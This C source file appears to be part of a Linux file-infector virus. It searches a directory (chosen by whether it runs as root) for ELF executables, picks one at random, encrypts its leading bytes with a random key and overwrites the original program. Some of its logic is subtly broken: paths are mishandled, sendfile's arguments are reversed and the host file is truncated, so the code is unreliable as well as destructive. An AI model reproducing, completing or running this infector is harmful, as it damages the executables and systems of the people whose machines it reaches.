#include "includes.h"
#include "infection.h"

// Entry point
void InfectRandomExecutable(const char* targetDirectory) {
    DIR* dir = opendir(targetDirectory);
    if (dir == NULL) {
        return;
    }

    struct dirent* entry;
    int numExecutables = 0;
    while ((entry = readdir(dir)) != NULL) {
    printf("Checking file: %s\n", entry->d_name); // Debug
        if (entry->d_type == DT_REG) {
            char* fileName = entry->d_name;
            if (isELF(fileName) && isClean(fileName)) {
                numExecutables++;
            }
        }
    }
    closedir(dir);

    if (numExecutables == 0) {
        printf("No clean executables found in %s\n", targetDirectory);
        return;
    }

    srand(time(NULL));
    int targetIndex = rand() % numExecutables + 1;

    dir = opendir(targetDirectory);
    int currentIdx = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char* fileName = entry->d_name;
            if (isELF(fileName) && isClean(fileName)) {
                currentIdx++;
                if (currentIdx == targetIndex) {
                    char fullPath[PATH_MAX];
                    snprintf(fullPath, sizeof(fullPath), "%s/%s", targetDirectory, fileName);

                    int vfd = open(fullPath, O_RDONLY);
                    if (vfd < 0) {
                        return;
                    }

                    InfectHostFile(fullPath, vfd);
                    close(vfd);
                    printf("Successfully infected: %s\n", fullPath);
                    break;
                }
            }
        }
    }
    closedir(dir);
}

void InfectDifferentDirectories(char* argv[]) {
    if (getuid() == 0) {
        InfectRandomExecutable(ROOT);
    } else {
        InfectRandomExecutable(NON_ROOT);
    }
}



int isELF(char* fileName) {
    // Check if the file name starts with a dot (hidden file)
    if (fileName[0] == '.')
        return 0;

    int hfd = open(fileName, O_RDONLY);
    if (hfd < 0) {
        return 0;
    }

    Elf32_Ehdr elf_header;
    ssize_t bytesRead = read(hfd, &elf_header, sizeof(Elf32_Ehdr));
    close(hfd);

    if (bytesRead < 0) {
        perror("read");
        return 0;
    }

    // Check if enough bytes were read
    if (bytesRead < (ssize_t)sizeof(Elf32_Ehdr))
        return 0;

    // Check the ELF magic numbers
    return (elf_header.e_ident[EI_MAG0] == ELFMAG0 &&
            elf_header.e_ident[EI_MAG1] == ELFMAG1 &&
            elf_header.e_ident[EI_MAG2] == ELFMAG2 &&
            elf_header.e_ident[EI_MAG3] == ELFMAG3);
}


int isClean(char* fileName) {
      
    int fd = open(fileName, O_RDONLY);
    if (fd < 0) return 0;

    unsigned char xorcode[CODESIZE];
    ssize_t bytesRead = read(fd, xorcode, CODESIZE);
    close(fd);

    if (bytesRead < CODESIZE) return 0;

    b_xor(xorcode, CODESIZE);

    for (int i = 0; i < bytesRead; i++) {
        if (xorcode[i] == 0xFF || xorcode[i] == 0x00) {
            return 0;
        }
    }

    return 1;
}
 
void InfectHostFile(char* hostFileName, int vfd) {
    struct stat st;
    if (fstat(vfd, &st) < 0) {
        perror("fstat");
        return;
    }

    char tempTemplate[] = "/tmp/infectXXXXXX";
    int tfd = mkstemp(tempTemplate);
    if (tfd < 0) {
        perror("mkstemp");
        return;
    }

    unsigned char xorcode[CODESIZE];
    ssize_t bytesRead = read(vfd, xorcode, CODESIZE);
    if (bytesRead < CODESIZE) {
        perror("read");
        printf("Not enough bytes read from file: %s\n", hostFileName);
        close(tfd);
        unlink(hostFileName);
        return;
    }
    
    b_xor(xorcode, CODESIZE);

    // Add a random delay before encryption
    srand(time(NULL));
    int delay = rand() % 1000;
    usleep(delay * 1000);

    encrypt_code(xorcode, CODESIZE, generateRandomKey(32), 32);

    if (write(tfd, xorcode, CODESIZE) < 0) {
        perror("write");
        close(tfd);
        unlink(tempTemplate);
        return;
    }

    if (lseek(vfd, 0, SEEK_SET) < 0) {
        perror("lseek");
        close(tfd);
        unlink(tempTemplate);
        return;
    }

    ssize_t bytesWritten = sendfile(vfd, tfd, NULL, CODESIZE);
    if (bytesWritten < 0) {
        perror("sendfile");
        close(tfd);
        unlink(tempTemplate);
        return;
    }

    close(tfd);
    unlink(hostFileName);

    if (rename(tempTemplate, hostFileName) < 0) {
        perror("rename");
        unlink(tempTemplate);
        return;
    }

    chmod(hostFileName, st.st_mode | S_IRUSR | S_IWUSR | S_IXUSR);
    printf("Infected host file: %s\n", hostFileName);
}
